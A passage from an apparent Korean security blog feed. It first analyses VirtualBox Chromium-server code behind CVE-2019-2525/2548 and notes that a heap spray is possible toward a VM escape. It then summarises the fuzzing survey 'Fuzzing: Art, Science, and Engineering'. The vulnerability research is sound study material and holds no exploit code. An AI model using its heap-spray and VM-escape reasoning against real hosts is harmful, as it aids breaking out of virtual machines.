class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> ClientStatus</span></span><br><span class="line"><span class="function"><span class="title">crServerServiceClient</span><span class="params">(<span class="keyword">const</span> RunQueue *qEntry)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    CRMessage *msg;</span><br><span class="line">    CRConnection *conn;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">        <span class="comment">/* Force scissor, viewport and projection matrix update in</span></span><br><span class="line"><span class="comment">         * crServerSetOutputBounds().</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        cr_server.currentSerialNo = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Commands get dispatched here */</span></span><br><span class="line">        crServerDispatchMessage( conn, msg, len );</span><br><span class="line"></span><br><span class="line">        crNetFree( conn, msg );</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>crServerDispatchMessage 함수를 호출한다.</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">crServerDispatchMessage</span><span class="params">(CRConnection *conn, CRMessage *msg, <span class="keyword">int</span> cbMsg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">    msg_opcodes = (<span class="keyword">const</span> CRMessageOpcodes *) msg;</span><br><span class="line">    opcodeBytes = (msg_opcodes-&gt;numOpcodes + <span class="number">3</span>) &amp; ~<span class="number">0x03</span>;</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">    data_ptr = (<span class="keyword">const</span> <span class="keyword">char</span> *) msg_opcodes + <span class="keyword">sizeof</span>(CRMessageOpcodes) + opcodeBytes;</span><br><span class="line">    data_ptr_end = (<span class="keyword">const</span> <span class="keyword">char</span> *)msg_opcodes + cbMsg; <span class="comment">// Pointer to the first byte after message data</span></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (fUnpack)</span><br><span class="line">    &#123;</span><br><span class="line">        crUnpack(data_ptr,                 <span class="comment">/* first command&#x27;s operands */</span></span><br><span class="line">                 data_ptr_end,             <span class="comment">/* first byte after command&#x27;s operands*/</span></span><br><span class="line">                 data_ptr - <span class="number">1</span>,             <span class="comment">/* first command&#x27;s opcode */</span></span><br><span class="line">                 msg_opcodes-&gt;numOpcodes,  <span class="comment">/* how many opcodes */</span></span><br><span class="line">                 &amp;(cr_server.dispatch));   <span class="comment">/* the CR dispatch table */</span></span><br><span class="line">    &#125;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>해당 함수는 msg를 CRMessageOpcodes로 캐스팅 후 crUnpack함수를 호출한다.</li><li>여기서 data_ptr에는 Opcode+data에서 Opcode를 제외한 data의 주소가 들어간다.</li><li>crUnpack 함수에서 Opcode값에 따른 로직을 처리하게 된다.</li><li>crVBoxServerClientWrite 함수 호출 이 후, svcFreeBuffer 함수를 호출하여 할당한 버퍼를 Free 시킨다.</li></ul><p><strong>따라서 alloc_buf에서 할당한 메모리는 crmsg가 호출되기 전까지 Free되지 않으므로 Heap Spray가 가능하다.</strong></p><hr><h3 id="Next-Posting"><a href="#Next-Posting" class="headerlink" title="Next Posting"></a>Next Posting</h3><p><img src="https://user-images.githubusercontent.com/49066484/138879933-fbb0a2b0-de18-42d6-857f-045ac5519d24.png" alt="5"></p><ul><li>CVE-2019-2525 : crUnpackExtendGetAttribLocation</li><li>CVE-2019-2548 : crServerDispatchReadPixels</li><li>각각 함수에서 취약점이 발견되었으며 이 두개를 활용하여 VM Exploit이 가능하다.</li></ul><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li>Virtualization Bug #1 Singi (멘토님 강의자료)</li><li><a href="https://github.com/niklasb/3dpwn">https://github.com/niklasb/3dpwn</a></li><li><a href="https://labs.f-secure.com/assets/BlogFiles/offensivecon-2019-3d-accelerated-exploitation-jason-matthyser.pdf">https://labs.f-secure.com/assets/BlogFiles/offensivecon-2019-3d-accelerated-exploitation-jason-matthyser.pdf</a></li><li><a href="https://wogh8732.tistory.com/273?category=804777">https://wogh8732.tistory.com/273?category=804777</a></li><li><a href="https://cosyp.tistory.com/247">https://cosyp.tistory.com/247</a></li><li><a href="https://1993-constant.tistory.com/590?category=927096">https://1993-constant.tistory.com/590?category=927096</a></li></ul>]]></content:encoded>
      
      
      <category domain="https://pwnkidhn.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://pwnkidhn.github.io/tags/1-day/">1-day</category>
      
      <category domain="https://pwnkidhn.github.io/tags/CVE/">CVE</category>
      
      <category domain="https://pwnkidhn.github.io/tags/VM-Escape/">VM Escape</category>
      
      <category domain="https://pwnkidhn.github.io/tags/VirtualBox/">VirtualBox</category>
      
      
      <comments>https://pwnkidhn.github.io/2021/10/25/2021-10-26-CVE-2019-2525_2548_1/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Fuzzing Art, Science, and Engineering Review</title>
      <link>https://pwnkidhn.github.io/2021/10/25/2021-10-26-FuzzingART/</link>
      <guid>https://pwnkidhn.github.io/2021/10/25/2021-10-26-FuzzingART/</guid>
      <pubDate>Mon, 25 Oct 2021 15:00:00 GMT</pubDate>
      
      <description>&lt;h2 id=&quot;0-용어-정리&quot;&gt;&lt;a href=&quot;#0-용어-정리&quot; class=&quot;headerlink&quot; title=&quot;0. 용어 정리&quot;&gt;&lt;/a&gt;0. 용어 정리&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;최초 Fuzz는 “대상 프로그램에서 사용할 임의의 문자 스트림을 생성하는 것”을 지칭하는 뜻.&lt;/li&gt;
&lt;li&gt;따라서 Fuzzing은 “PUT(Program Under Test)에 Fuzz 된 입력 값을 넣고 실행하는 행위”&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&quot;0-1-Fuzzing&quot;&gt;&lt;a href=&quot;#0-1-Fuzzing&quot; class=&quot;headerlink&quot; title=&quot;0-1. Fuzzing&quot;&gt;&lt;/a&gt;0-1. Fuzzing&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;Definition 2.1 (Fuzzing).&lt;br&gt;Fuzzing is the execution of PUT using input(s) sampled from an input space (the&lt;br&gt;“fuzz input space”) that protrudes the expected input space of the PUT&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;퍼징(Fuzzing)은 PUT의 예상 입력 공간을 벗어나는 입력 공간 (이를 “퍼즈 입력 공간”이라 한다)에서 추출한 입력을 사용하여 PUT에 대해 실행하는 것이다.&lt;/li&gt;
&lt;li&gt;즉, 예상되는 데이터 입력을 벗어나는 값을 사용하여 실행하는 행위&lt;/li&gt;
&lt;/ul&gt;</description>
      
      
      
      <content:encoded><![CDATA[<h2 id="0-용어-정리"><a href="#0-용어-정리" class="headerlink" title="0. 용어 정리"></a>0. 용어 정리</h2><ul><li>최초 Fuzz는 “대상 프로그램에서 사용할 임의의 문자 스트림을 생성하는 것”을 지칭하는 뜻.</li><li>따라서 Fuzzing은 “PUT(Program Under Test)에 Fuzz 된 입력 값을 넣고 실행하는 행위”</li></ul><h3 id="0-1-Fuzzing"><a href="#0-1-Fuzzing" class="headerlink" title="0-1. Fuzzing"></a>0-1. Fuzzing</h3><blockquote><p>Definition 2.1 (Fuzzing).<br>Fuzzing is the execution of PUT using input(s) sampled from an input space (the<br>“fuzz input space”) that protrudes the expected input space of the PUT</p></blockquote><ul><li>퍼징(Fuzzing)은 PUT의 예상 입력 공간을 벗어나는 입력 공간 (이를 “퍼즈 입력 공간”이라 한다)에서 추출한 입력을 사용하여 PUT에 대해 실행하는 것이다.</li><li>즉, 예상되는 데이터 입력을 벗어나는 값을 사용하여 실행하는 행위</li></ul><span id="more"></span><h3 id="0-2-Fuzz-Testing"><a href="#0-2-Fuzz-Testing" class="headerlink" title="0-2. Fuzz Testing"></a>0-2. Fuzz Testing</h3><blockquote><p>Definition 2.2 (Fuzz Testing).<br>Fuzz testing is the use of fuzzing where the goal is to test a PUT against a security policy.</p></blockquote><ul><li>퍼즈테스팅은 “대상 프로그램이 보안 정책을 준수하는지 여부를 퍼징을 통해 점검하<br>는 것”으로 정의할 수 있다.</li></ul><h3 id="0-3-Fuzzer"><a href="#0-3-Fuzzer" class="headerlink" title="0-3. Fuzzer"></a>0-3. Fuzzer</h3><blockquote><p>Definition 2.3 (Fuzzer).<br>A fuzzer is a program that performs fuzz testing on a PUT.</p></blockquote><ul><li>퍼저는 대상 프로그램에 퍼즈 테스팅을 수행하는 프로그램이다.</li></ul><h3 id="0-4-Fuzz-Campaign"><a href="#0-4-Fuzz-Campaign" class="headerlink" title="0-4. Fuzz Campaign"></a>0-4. Fuzz Campaign</h3><blockquote><p>Definition 2.4 (Fuzz Campaign).<br>A fuzz campaign is a specific execution of a fuzzer on a PUT with a specific security policy.</p></blockquote><ul><li>퍼즈 캠페인은 특정 보안 정책에 대해 특정 데이터를 넣는 실행이다.<ul><li>요구되는 특정 보안 정책을 위반하는 버그를 찾아 내기 위함이다.</li></ul></li></ul><h3 id="0-5-Bug-Oracle-Crash-Monitor"><a href="#0-5-Bug-Oracle-Crash-Monitor" class="headerlink" title="0-5. Bug Oracle (Crash Monitor)"></a>0-5. Bug Oracle (Crash Monitor)</h3><blockquote><p>Definition 2.5 (Bug Oracle).<br>A bug oracle is a program, perhaps as part of a fuzzer, that determines whether a given execution of the PUT violates a specific security policy.</p></blockquote><ul><li>버그 오라클은 대상 프로그램이 주어진 실행에서 특정 보안 정책을 위반하는지를 판<br>별하는 프로그램으로, 퍼저의 일부분으로 포함되어 있다.</li></ul><h3 id="0-6-Fuzz-Configuration"><a href="#0-6-Fuzz-Configuration" class="headerlink" title="0-6. Fuzz Configuration"></a>0-6. Fuzz Configuration</h3><blockquote><p>Definition 2.6 (Fuzz Configuration).<br>A fuzz configuration of a fuzz algorithm comprises the parameter value(s) that control(s) the fuzz algorithm.</p></blockquote><ul><li>퍼즈 환경설정은 퍼즈 알고리즘을 제어하는 파라미터 값들을 포함한다.</li><li>보통 튜플(Tuple) 형태로 작성된다.</li></ul><h3 id="0-7-Seed-Data"><a href="#0-7-Seed-Data" class="headerlink" title="0-7. Seed Data"></a>0-7. Seed Data</h3><ul><li>Input data를 만들 때 원인이 되는 Seed 파일이다.</li></ul><h3 id="0-8-Seed-Trimming-Crash-Minimization"><a href="#0-8-Seed-Trimming-Crash-Minimization" class="headerlink" title="0-8. Seed Trimming (Crash Minimization)"></a>0-8. Seed Trimming (Crash Minimization)</h3><ul><li>크래쉬가 터졌을 때 그 조건을 만족하는 Input을 최소화 하는 행위이다.</li></ul><h3 id="0-9-Mutation"><a href="#0-9-Mutation" class="headerlink" title="0-9. Mutation"></a>0-9. Mutation</h3><ul><li>Seed data의 값을 변조하는 행위이다.</li></ul><h3 id="0-10-Input-data-Test-Case"><a href="#0-10-Input-data-Test-Case" class="headerlink" title="0-10. Input data (Test Case)"></a>0-10. Input data (Test Case)</h3><ul><li>Mutation을 통해 만들어진 데이터로 Fuzzing의 최초 정의에서 의 Fuzz된 입력 값을 뜻한다.</li></ul><hr><h2 id="1-Fuzz-Testing-Algorithm"><a href="#1-Fuzz-Testing-Algorithm" class="headerlink" title="1. Fuzz Testing Algorithm"></a>1. Fuzz Testing Algorithm</h2><p><img src="https://user-images.githubusercontent.com/49066484/138784004-d7626bb5-5ba4-482f-9a17-61824fb81547.png" alt="Fuzzing%20Art,%20Science,%20and%20Engineering%20c48514ac84f24850b5177761eac9ca66/_.png"></p><ul><li>Input 값으로 퍼즈 환경설정(C)와 타임아웃(t_limit)이 있고, 발견된 버그의 집합 (B)를 Output으로 반환한다.</li><li>전처리 단계 Preprocess 함수 호출 후, 반복문 안에서 Schedule, InputGen, InputEval, ConfUpdate, Continue 함수들이 수행된다.</li><li>각 루프를 수행하는 것을 ‘Fuzz iteration’이라 하고, 하나의 테스트 케이스에 대해 Input Eval이 수행되는 것을 ‘Fuzz run’이라 한다.</li><li>단, 모든 퍼저가 이러한 5개의 함수들을 포함하는 것은 아니다.</li></ul><h3 id="1-1-Preprocess-C-→-C"><a href="#1-1-Preprocess-C-→-C" class="headerlink" title="1-1. Preprocess(C) → C"></a>1-1. Preprocess(C) → C</h3><ul><li>전처리 단계에서는 사용자가 퍼즈 환경설정으로 사용할 값들을 지정하면, 이를 적절히 수정한 상태로 다시 반환하게 된다.</li></ul><h3 id="1-2-Schedule-C-t-elapsed-t-limit-→-conf"><a href="#1-2-Schedule-C-t-elapsed-t-limit-→-conf" class="headerlink" title="1-2. Schedule(C, t_elapsed, t_limit) → conf"></a>1-2. Schedule(C, t_elapsed, t_limit) → conf</h3><ul><li>Schedule 함수는 현재의 퍼즈 환경설정(C) 집합과, 수행 시간 (t_elapsed), 종료 시점(t_limit)을 입력 값으로 하여, 이번 fuzz iteration에서 사용할 특정 설정 값 conf를 지정한다.</li></ul><h3 id="1-3-InputGen-conf-→-tcs"><a href="#1-3-InputGen-conf-→-tcs" class="headerlink" title="1-3. InputGen(conf) → tcs"></a>1-3. InputGen(conf) → tcs</h3><ul><li>InputGen 함수는 퍼즈 환경설정을 토대로 구체적인 테스트 케이스의 집합(tcs)을 생성한다. 테스트 케이스를 생성할 때에는 현재 conf에 설정된 특정 파라미터들을 이용한다. 일부 퍼저는 Seed 방식을 사용하기도 하고, 나머지는 Model 또는 Grammar를 파라미터로 사용하기도 한다.</li></ul><h3 id="1-4-InputEval-conf-tcs-O-bug-→-B’-execinfos"><a href="#1-4-InputEval-conf-tcs-O-bug-→-B’-execinfos" class="headerlink" title="1-4. InputEval(conf, tcs, O_bug) → B’, execinfos"></a>1-4. InputEval(conf, tcs, O_bug) → B’, execinfos</h3><ul><li>InputEval함수는 퍼즈 환경설정과, 테스트 케이스, 그리고 버그 오라클을 입력으로 받는다. 이 단계에서 테스트 케이스를 대상 프로그램에 주입한 후, 해당 실행 과정에서 보안 정책 위반이 발생 하는지를 버그 오라클을 사용하여 점검한다. 이때 버그가 발견되었다면 그 버그 결과와 해당 fuzz run에서 사용된 기타 정보들(execinfos)가 반환 된다. 이때 버그 오라클은 Fuzzer 내부에 포함되어 있다고 가정한다.</li></ul><h3 id="1-5-ConfUpdate-C-conf-execinfos-→-C"><a href="#1-5-ConfUpdate-C-conf-execinfos-→-C" class="headerlink" title="1-5. ConfUpdate(C, conf, execinfos) → C"></a>1-5. ConfUpdate(C, conf, execinfos) → C</h3><ul><li>ConfUpdate 함수는 퍼즈 환경설정(C)과, 현재 설정된 값(conf), 그리고 각각의 fuzz run이 수행될 때의 관련 정보(execinfos)를 입력으로 하여, 퍼즈 환경설정(C)을 업데이트한 값을 결과로 반환한다. 예를 들어 상당수의 그레이 박스 퍼저들은 execinfos의 정보를 기반으로 퍼즈 환경설정(C)의 범위를 축소시킨다.</li></ul><h3 id="1-6-Continue-C-→-True-False"><a href="#1-6-Continue-C-→-True-False" class="headerlink" title="1-6. Continue(C) → {True, False}"></a>1-6. Continue(C) → {True, False}</h3><ul><li>Continue 함수는 퍼즈 환경설정(C)을 기반으로 하여, 다음 fuzz iteration을 수행 여부를 참과 거짓으로 판정하는 Boolean 값을 반환한다.</li></ul><hr><h2 id="2-Fuzzer-분류"><a href="#2-Fuzzer-분류" class="headerlink" title="2. Fuzzer 분류"></a>2. Fuzzer 분류</h2><ul><li>통상적인 소프트웨어 테스팅 분야에서는 크게 두 가지 (Black-box, White-box) 테스트로만 분류되지만, 퍼저는 Black, White, Grey 세 가지로 구분할 수 있다.</li><li>하지만 엄밀히 따지면 Grey-box 퍼징 역시 약간의 정보가 주어지는 상태에서 수행하므로 White-box 퍼징의 한 가지 종류에 속한다고 볼 수도 있다.</li></ul><h3 id="2-1-Black-box-Fuzzer"><a href="#2-1-Black-box-Fuzzer" class="headerlink" title="2-1. Black-box Fuzzer"></a>2-1. Black-box Fuzzer</h3><ul><li>PUT의 내부를 들여다 보지 않는다.</li><li>오직 PUT의 input과 output만을 관찰함으로써 퍼징을 진행한다.</li><li>IO-driven, Data-driven testing 이라고 부르기도 한다.</li><li>ex) SPIKE, BFF, OF, zzuf</li></ul><h3 id="2-2-White-box-Fuzzer"><a href="#2-2-White-box-Fuzzer" class="headerlink" title="2-2. White-box Fuzzer"></a>2-2. White-box Fuzzer</h3><ul><li>PUT의 내부를 알고 있다. (소스코드를 알고있거나, 바이너리 분석이 가능하다.)</li><li>Black-box 방식보다 오버헤드가 크다.</li></ul><h3 id="2-3-Grey-box-Fuzzer"><a href="#2-3-Grey-box-Fuzzer" class="headerlink" title="2-3. Grey-box Fuzzer"></a>2-3. Grey-box Fuzzer</h3><ul><li>White-box와는 달리 PUT의 전체적인 범위를 알 수는 없다.</li><li>PUT에 대한 기본적인 정보만 제공 받는다. (프로토콜 정보..)</li><li>ex) AFL, VUzzer</li></ul><hr><h2 id="3-Preprocess"><a href="#3-Preprocess" class="headerlink" title="3. Preprocess"></a>3. Preprocess</h2><ul><li>어떤 퍼저들은 첫 번째 fuzz iteration을 수행하기 전에 fuzz configuration의 초기 설정을 수정하기도 한다.</li><li>이러한 전처리 작업은 보통 PUT을 Instrumentation, Seed Selection, Seed Trimming 기법을 사용하기 위해서 사용된다.</li></ul><h3 id="3-1-Instrumentation"><a href="#3-1-Instrumentation" class="headerlink" title="3-1. Instrumentation"></a>3-1. Instrumentation</h3><ul><li>input 값에 대한 피드백을 받기 위해서 하는 행위.</li><li>White,Grey-box 퍼저들은 PUT이 fuzz run 된 Evaluation 결과에 대한 정보를 피드백하여 instrument하거나, 실행 중인 메모리 정보들을 이용해 퍼징 할 수 있다.</li><li>Process trace 나 System call trace를 사용하여 PUT 내부의 정보를 얻는 방법도 있지만, instrumentation 기법을 사용하는 이유는 그중 보다 유의미한 정보만을 취득하기 위해 사용한다.</li><li>Static : PUT을 수행하기 전의 상태를 토대로 파악한다. (소스코드가 필요하다.)</li><li>Dynamic : PUT이 수행되는 동안의 정보를 수집한다. (정적보다 오버헤드가 크다.)<ul><li>ex) DynInst, DynamoRIO, Pin, Valgrind, QEMU</li></ul></li><li>Static, Dynamic을 혼합해서 사용할 수 있다.<ul><li>AFL : 특수한 컴파일러 사용 (Static) + QEMU 사용(Dynamic)</li></ul><h3 id="3-1-1-Execution-Feedback"><a href="#3-1-1-Execution-Feedback" class="headerlink" title="3-1-1. Execution Feedback"></a>3-1-1. Execution Feedback</h3><ul><li>퍼저를 실행하면서 피드백을 받아 더욱 유익한 퍼징 실행이 될 수 있도록 하기 위한 방법.</li><li>Grey-box 퍼저는 대부분 execution feedback을 input으로 하여 test case를 발전시킨다.</li></ul><h3 id="3-1-2-In-Memory-Fuzzing"><a href="#3-1-2-In-Memory-Fuzzing" class="headerlink" title="3-1-2. In-Memory Fuzzing"></a>3-1-2. In-Memory Fuzzing</h3><ul><li>큰 바이너리를 퍼징할 때 프로그램을 계속 재시작하는 오버헤드가 발생하는데, 이를 해결하기 위해, 메모리 스냅샷을 떠두고 메모리에서 퍼징을 하고 다시 메모리만 돌리는 방법.</li><li>Crash 발생 시 아까 떠두었던 메모리 스냅샷 이용한다. (처음부터 다시 시작할 필요 없음)</li><li>하지만 똑같은 버그 발생 조건을 갖추어도 버그가 발생하지 않을 수 있다.<ul><li>(=Reproduce가 안 될 수 있음)</li></ul></li></ul><h3 id="3-1-3-Thread-Scheduling"><a href="#3-1-3-Thread-Scheduling" class="headerlink" title="3-1-3. Thread Scheduling"></a>3-1-3. Thread Scheduling</h3><ul><li>Thread 로 동작하는 프로그램의 경우 트리거가 안되는 버그가 존재 할 수 있고, Reproduce가 안될 수 있기 때문에 Thread scheduling을 instrumentation을 통해 명시적으로 해줄 수 있다.</li><li>경우에 따라 Race condition 의 취약점을 더 잘 찾아 주는 효과가 발생한다.</li></ul></li></ul><h3 id="3-2-Seed-Selection"><a href="#3-2-Seed-Selection" class="headerlink" title="3-2. Seed Selection"></a>3-2. Seed Selection</h3><ul><li>InputData를 만들 때 쓰인다.</li><li>전처리 작업에서 Seed selection이 필요한 이유는 가끔 이 seed가 엄청 많을 경우, 단순히 다양한 seed를 넣어 보는 것이 비 효율적일 수 있기 때문이다.<ul><li>이러한 문제를 seed selection problem 이라고 부른다.</li></ul></li><li>Seed Selection Problem</li><li>Minset Computation : coverage가 동일한 최소의 set을 찾는 것을 목표로한다.<ul><li>(여기서 coverage는 다양한 의미로 쓰인다.)</li><li>ex)  {s1 → {10,20}, s2 → {20,30}}. 대략 s1과 s2만큼 빠르게 실행되는 세 번째 시드 s3 → {10, 20, 30}이있는 경우, s1과 s2 대신 s3을 만드는 것이 더 효과적일 수 있다.</li></ul></li></ul><h3 id="3-3-Seed-Trimming"><a href="#3-3-Seed-Trimming" class="headerlink" title="3-3. Seed Trimming"></a>3-3. Seed Trimming</h3><ul><li>동일한 목적을 달성하는 여러 개의 Seed를 제거하기 위한 방법론이다.</li><li>Seed의 개수를 줄이는 것과 Seed의 내용을 줄이는 것을 포함한다.</li></ul><h3 id="3-4-Preparing-a-Driver-Application"><a href="#3-4-Preparing-a-Driver-Application" class="headerlink" title="3-4. Preparing a Driver Application"></a>3-4. Preparing a Driver Application</h3><ul><li>PUT을 직접적으로 퍼징 하기가 곤란한 경우, 퍼징을 위한 중간 프로그램을 준비하는 것이다.</li><li>퍼징 대상이 라이브러리인 경우, 해당 라이브러리 내부의 함수를 호출하는 드라이버 프로그램을 만들어서 퍼징한다.</li><li>퍼징 대상이 커널인 경우, userland app을 퍼징함으로써 커널을 퍼징한다.</li><li>퍼징 대상이 IoT인 경우, 스마트 어플리케이션을 드라이버로 하여  IoT장치를 퍼징한다.</li></ul><hr><h2 id="4-Scheduling"><a href="#4-Scheduling" class="headerlink" title="4. Scheduling"></a>4. Scheduling</h2><ul><li>퍼징을 할 때 설정 값을 얼마나 자주 바꿔줄 것 인가에 대한 선택 메커니즘이다.</li><li>목적은 다양한 조건을 피드백 받아 다음 Seed 선택을 용이하게 하기 위함이다.<ul><li>간단한 퍼저 일수록 스케줄링 알고리즘이 필요하지 않다.</li></ul></li></ul><h3 id="4-1-The-Fuzz-Configuration-Scheduling-FCS-Problem"><a href="#4-1-The-Fuzz-Configuration-Scheduling-FCS-Problem" class="headerlink" title="4-1. The Fuzz Configuration Scheduling (FCS) Problem"></a>4-1. The Fuzz Configuration Scheduling (FCS) Problem</h3><ul><li>근본적으로 모든 스케줄 알고리즘은 exploration과 exploitation이라는 측면에서 상충되는 문<br>제를 겪게 된다.</li><li>exploration : 나중 결정을 위해 보다 정확한 정보를 수집하는데 시간을 할애하는 것.</li><li>exploitation : 현재 가장 유리한 결과물을 얻는데 최선을 다하는 것.</li><li>이러한 문제를 FCS Problem이라 정의한다.</li></ul><h3 id="4-2-Black-box-FCS-Algorithms"><a href="#4-2-Black-box-FCS-Algorithms" class="headerlink" title="4-2. Black-box FCS Algorithms"></a>4-2. Black-box FCS Algorithms</h3><ul><li>블랙박스 퍼징의 상황에서 FCS 알고리즘이 사용할 수 있는 유일한 정보는 특정 configuration을 넣었을 때에 대한 결과값 뿐이다.</li></ul><h3 id="4-3-Grey-box-FCS-Algorithms"><a href="#4-3-Grey-box-FCS-Algorithms" class="headerlink" title="4-3. Grey-box FCS Algorithms"></a>4-3. Grey-box FCS Algorithms</h3><ul><li>블랙박스 보다 많은 정보를 가지고 피드백 받을 수 있다.</li><li>fuzz configuration의 coverage 범위와 같은 정보의 집합을 이용한다.</li><li>각각의 알고리즘은 최대의 효율을 가지기 위해 각자의 알고리즘을 사용하고 있다.<ul><li>시드 적합성, 시드선택, 시드의 유용성 등을 고려.</li><li>좋은 시드들을 군집화 하여 테스팅에 가중치를 줌 (동일한 가중치 일 때는 작은 시드를 선호)</li></ul></li></ul><h3 id="4-4-White-box-FCS-Algorithms"><a href="#4-4-White-box-FCS-Algorithms" class="headerlink" title="4-4. White-box FCS Algorithms"></a>4-4. White-box FCS Algorithms</h3><ul><li>심볼릭 익스큐션 등 굉장히 복잡하다. (논문에서 생략)</li></ul><hr><h2 id="5-Input-Generation"><a href="#5-Input-Generation" class="headerlink" title="5. Input Generation"></a>5. Input Generation</h2><ul><li>테스트 케이스를 통해 전달되는 데이터의 내용이 곧바로 버그를 발생 시키는 지의 여부와 직접적인 연관이 있기 때문에, 어떠한 입력 값을 만들어내는지를 주관하는 기술은 Fuzzer의 가장 핵심적인 설계 요소라고 할 수 있다.</li><li>Generation-based 방식과 Mutation-based 방식으로 나뉜다.</li><li>Generation-based : PUT이 처리할 수 있는 입력 값 데이터에 대한 모델을 주고<br>이를 기반으로 새로운 테스트 케이스를 만들도록 한다. (Model-based)</li><li>Mutation-based : 주어진 Seed를 기반으로 하여 약간의 변이를 주면서 다음 테스트 케이스를 만들도록 한다. (Model-less)</li></ul><h3 id="5-1-Model-based-Generation-based-Fuzzers"><a href="#5-1-Model-based-Generation-based-Fuzzers" class="headerlink" title="5-1. Model-based(Generation-based) Fuzzers"></a>5-1. Model-based(Generation-based) Fuzzers</h3><ul><li>모델 기반 퍼지는 PUT이 수용할 수 있는 입력 또는 실행을 설명하는 주어진 모델을 기반으<br>로 테스트 케이스를 생성한다.</li></ul><h3 id="5-1-1-Predefined-Model"><a href="#5-1-1-Predefined-Model" class="headerlink" title="5-1-1. Predefined Model"></a>5-1-1. Predefined Model</h3><ul><li>사전 정의에 따른 모델은 보통 사용자가 직접 관련된 설정 값을 지정하도록 한다.</li><li>분석가가 EBNF와 같은 문법으로 해당 프로그램의 입력 값 또는 프로토콜의 명세 알맞은 모델링을 수행하여 지정한다.</li></ul><h3 id="5-1-2-Inferred-Model"><a href="#5-1-2-Inferred-Model" class="headerlink" title="5-1-2. Inferred Model"></a>5-1-2. Inferred Model</h3><ul><li>사전 정의된 로직 또는 사용자 제공 모델에 의존하는 것보다는 모델을 스스로 추론하는 것<br>이 최근에 주목을 받고 있다.</li><li>모델 추론은 Preprocess 단계 혹은 ConfUpdate 단계에서 적용될 수 있다.</li></ul><h3 id="5-2-Model-less-Mutation-based-Fuzzers"><a href="#5-2-Model-less-Mutation-based-Fuzzers" class="headerlink" title="5-2. Model-less(Mutation-based) Fuzzers"></a>5-2. Model-less(Mutation-based) Fuzzers</h3><ul><li>PUT의 입력 값을 seed로 하여 그 seed 값을 mutate 하는 방식으로 새로운 테스트 케이스를 만드는 것이 대부분의 Model-less 퍼저들이 수행하는 방식이다.</li><li>이때 seed 들은 PUT에 적용될 수 있도록 구조화가 잘 되어 있는 것이며, 파일, 네트워크 패킷, 일련의 UI 이벤트들이 될 수 있다.</li><li>유효한 파일이 주어지면 그것의 일부분만을 살짝 변경함으로써, 나머지 대부분의 내용은 여전히 유효하지만 일부분의 비정상 값에 의해 PUT의 충돌을 유발하도록 하는 테스트 케이스를 만드는 것을 목표로 한다.</li></ul><h3 id="5-2-1-Bit-Flipping"><a href="#5-2-1-Bit-Flipping" class="headerlink" title="5-2-1. Bit-Flipping"></a>5-2-1. Bit-Flipping</h3><ul><li>고정된 몇 개의 bit를 변경하거나, 그 개수마저 무작위로 변경하는 방식이다.</li><li>mutation ratio를 사용자가 parameter로 지정하도록 하기도 한다.</li></ul><h3 id="5-2-2-Arithmetic-Mutation"><a href="#5-2-2-Arithmetic-Mutation" class="headerlink" title="5-2-2. Arithmetic Mutation"></a>5-2-2. Arithmetic Mutation</h3><ul><li>AFL이나 honggfuzz는 정수의 byte sequence 일부를 찾아서 그 부분을 치환한다.<ul><li>예를 들어 i라는 값을 i ± r로 바꾸는데 이때 r은 0 &lt;= r &lt;35에 해당하도록 한다.</li></ul></li></ul><h3 id="5-2-3-Block-based-Mutation"><a href="#5-2-3-Block-based-Mutation" class="headerlink" title="5-2-3. Block-based Mutation"></a>5-2-3. Block-based Mutation</h3><ul><li>시드의 byte sequence를 block이라고 정의한다.</li><li>해당 seed에서 무작위적인 위치에 새로운 block을 삽입하거나 기존 block을 일부 삭제하는 등의 방법이다.</li><li>그 외에 블록 내용을 변경하거나 순열의 조합을 변경, 덧붙이기, 짜깁기 등의 변형 또한 가능하다.</li><li>시드를 특정 블럭으로 나눌 수 있는 경우 블럭을 나열하고 거기서 블럭들을 기반으로 삽입, 삭제, 대체 등을 한다.(radamsa)</li></ul><h3 id="5-2-4-Dictionary-based-Mutation"><a href="#5-2-4-Dictionary-based-Mutation" class="headerlink" title="5-2-4. Dictionary-based Mutation"></a>5-2-4. Dictionary-based Mutation</h3><ul><li>실제로 개발자들이 실수를 많이 할 수 있는 산술 연산 오류 포인트를 노린다.</li><li>-1 , 0 , 1 등을 정의해 놓고 이 숫자 값을 우선적으로 대입한다.</li></ul><h3 id="5-3-White-box-Fuzzers"><a href="#5-3-White-box-Fuzzers" class="headerlink" title="5-3. White-box Fuzzers"></a>5-3. White-box Fuzzers</h3><ul><li>White-box 역시 model-based 방법이나 model-less 방법을 적용하는 것이 가능하다.</li><li>보통 dynamic symbolic execution을 통해 테스트 케이스를 만든다.</li></ul><h3 id="5-3-1-Dynamic-Symbolic-Execution"><a href="#5-3-1-Dynamic-Symbolic-Execution" class="headerlink" title="5-3-1. Dynamic Symbolic Execution"></a>5-3-1. Dynamic 